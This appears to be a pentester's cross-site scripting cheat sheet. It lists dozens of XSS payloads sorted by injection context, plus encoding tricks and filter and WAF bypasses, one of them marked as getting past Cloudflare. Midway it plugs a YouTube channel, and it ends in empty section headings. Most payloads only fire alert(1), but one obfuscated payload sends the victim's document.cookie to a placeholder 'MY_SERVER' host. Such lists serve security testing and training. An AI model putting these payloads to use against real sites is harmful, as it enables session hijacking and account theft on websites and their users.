```
https://jsfuck.com/  ------------ Encoding the alert(1) payload to trigger XSS.
 
https://utf-8.jp/public/aaencode.html    ------------    aaencode - Encode any JavaScript program to Japanese style emoticons (^_^)
 
https://utf-8.jp/public/jjencode.html -----------------       Encoding the alert(1) payload to trigger XSS.
 
https://web.archive.org/web/20120308175425/http://www.andlabs.org/tools/jsrecon.html    --------------- Por Scanning with JS-Recon
 
 
data:text/html, <script>alert('self-xss')</script>
 
<span onmouseover="console.info('Sounds good')">Great Site</span> . If we paste the payload in the feedback form and we got only Great site message the site is vulnerable to Stored Xss.
 
https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html   --- XSS Cheat sheet.
 
https://html5sec.org/       ------- HTML5 Security cheat sheet.
 
 
<svg onload%09=alert(1)>
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2C%3B=alert(1)>
<svg onload%0B=alert(1)> 
<scr<iframe>ipt>alert(1)</script>
 
Test"><svg/onload=alert(1)>
Test";alert(1);//
 
<object data="javascript:alert(1)">  -- blocked!!
 
<object data="data:text/html,<script>alert(1)</script>">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="> -- Base64 encoding
 
Input --- <script>alert(1)</script> o/p: 'scriptalert()script'
 
associate"/<script>alert(1)<script>
 
Payload Used : "><img src=x onerror=alert(1)> [Blocked By Cloudflare]
 
Payload Used : "><img src=x onerrora=confirm() onerror=confirm(1)> [XSS Popup]
 
Payload -- </s</script>cri</script>pt><img src="x" on</script>error=d</script>ocu</script>ment</script>.</script>loca</script>tion</script>.</script>h</script>ref='MY_SERVER?cookie='+do</script>cumen</script>t.c</script>ooki</script>e>, which readable version is </script><img src="x" onerror=document.href='MY_SERVER?cookie='+document.cookie
 
HTML Injection
Use when input lands inside an attribute’s value of an HTML tag or outside tag except the ones described in next case. Prepend a “-->” to payload if input lands in HTML comments.
<svg onload=alert(1)>
"><svg onload=alert(1)>
 
HTML Injection – Tag Block Breakout
Use when input lands inside or between opening/closing of the following tags:
<title><style><script><textarea><noscript><pre><xmp> and <iframe> (</tag> is accordingly).
</tag><svg onload=alert(1)>
"></tag><svg onload=alert(1)>
 
HTML Injection - Inline
Use when input lands inside an attribute’s value of an HTML tag but that tag can’t be terminated by greater than sign (>).
"onmouseover=alert(1) //
"autofocus onfocus=alert(1) //
 
HTML Injection - Source
 
Use when input lands as a value of the following HTML tag attributes: href, src, data or action (also formaction). Src attribute in script tags can be an URL or “data:,alert(1)”.
javascript:alert(1)
 
Javascript Injection
Use when input lands in a script block, inside a string delimited value.
'-alert(1)-'
'/alert(1)//
 
 
Javascript Injection - Escape Bypass
Use when input lands in a script block, inside a string delimited value but quotes are escaped by a backslash.
\'/alert(1)//
 
Javascript Injection – Script Breakout
Use when input lands anywhere within a script block.
</script><svg onload=alert(1)>
 
Javascript Injection - Logical Block
Use 1st or 2nd payloads when input lands in a script block, inside a string delimited value and inside a single logical block like function or conditional (if, else, etc). If quote is escaped with a backslash, use 3rd payload.
'}alert(1);{'
'}alert(1)%0A{'
\'}alert(1);{//
 
Javascript Injection - Quoteless
 
Use when there’s multi reflection in the same line of JS code. 1st payload works in simple JS variables and 2nd one works in non-nested JS objects.
/alert(1)//\
/alert(1)}//\
 
Javascript Context - Placeholder Injection in Template LiteralUse when input lands inside backticks (``) delimited strings or in template engines.
${alert(1)}
 
Multi Reflection HTML Injection - Double Reflection (Single Input)
Use to take advantage of multiple reflections on same page.
'onload=alert(1)><svg/1='
'>alert(1)</script><script/1='
/alert(1)</script><script>/
 
Multi Reflection i HTML Injection - Triple Reflection (Single Input)
Use to take advantage of multiple reflections on same page.
/alert(1)">'onload="/<svg/1='
-alert(1)">'onload="<svg/1='
/</script>'>alert(1)/<script/1='
 
Multi Input Reflections HTML Injection - Double & Triple
Use to take advantage of multiple input reflections on same page. Also useful in HPP (HTTP Parameter Pollution) scenarios, where there are reflections for repeated parameters. 3rd payload makes use of comma-separated reflections of the same parameter.
p=<svg/1='&q='onload=alert(1)>
p=<svg 1='&q='onload='/&r=/alert(1)'>
q=<script/&q=/src=data:&q=alert(1)>
 
 
File Upload Injection – Filename
Use when uploaded filename is reflected somewhere in target page.
"><svg onload=alert(1)>.gif
 
 
File Upload Injection – Metadata
Use when metadata of uploaded file is reflected somewhere in target page. It uses command-line exiftool (“$” is the terminal prompt) and any metadata field can be set.
$ exiftool -Artist='"><svg onload=alert(1)>' xss.jpeg
 
 
File Upload Injection – SVG File
Use to create a stored XSS on target when uploading image files. Save content below as
“xss.svg”.
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
 
 
DOM Insert Injection
Use to test for XSS when injection gets inserted into DOM as valid markup instead of being reflected in source code. It works for cases where script tag and other vectors won’t work.
<img src=1 onerror=alert(1)>
<iframe src=javascript:alert(1)>
<details open ontoggle=alert(1)>
<svg><svg onload=alert(1)>
 
 
DOM Insert Injection – Resource Request
Use when native javascript code inserts into page the results of a request to an URL that can be controlled by attacker.
data:text/html,<img src=1 onerror=alert(1)>
data:text/html,<iframe src=javascript:alert(1)>
 
 
PHP Self URL Injection
 
Learn More Tip and tricks don't forget subscribe my YouTube Channel:-https://www.youtube.com/@Hacksentrypro?sub_confirmation=1				
 			Payloads:
<script <script>>alert('l33t')</script>
 
'><img src=0 onerror=alert(1)>
'><img src=0 onerror=alert('l33t');> 
%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3C!--
<img src=x onerror="document.getElementById('ConsoleLog').stylebackgroundColor='red',"/>
 
Bypass client side xss filters:
x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>
>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>> 
 
<script>alert(/Chrome%20XSS%20filter%20bypass/);</script> 
 
<a href="http://foo.at"><script>alert(81)</script>"page=1">google </a>
 
iframe src="javascript:alert(1)">  
 
<span onmouseover="console.info('sounds good')">Great site</span>
 
%253c%252fscript%253e%253cscript%253ealert%2528document.cookie%2529%253c%252fscript%253e
  
 
Without even handlers
 
<form><button formaction=javascript:alert('l33t');>click
 
Encoding () characters html encoding
<svg><script>alert&lpar;'l33t'&rpar;
 
 <svg><script>alert&#x28;'l33t'&#x29;
 
<svg><script>confirm&lpar;'l33t'&rpar;   --- when alert is blocked (or )
<svg><script>confirm&lpar;'l33t'&rpar;</script></svg>
 
 
<svg onload=alert(1)>  bypass tec      <svg/onload=alert(1)>, <svg/////onload=alert(1)>, <svg id=x;onload=alert(1)>. 
<keygen autofocus onfocus=alert(1)>
<video><source onerror="alert(1)">
<marquee onstart=alert(1)>
 					
 				 
Encode the payload in multiple ways to bypass the restriction.
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 	
 					
 
 																					
 				 												
 	 
 
 
 
 
 
 
 
 
 
 
Fourth Type of XSS:
 
 
 
 
 
 
What we can do if we find out an XSS:
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
Bypassing the SCRIPT tags
```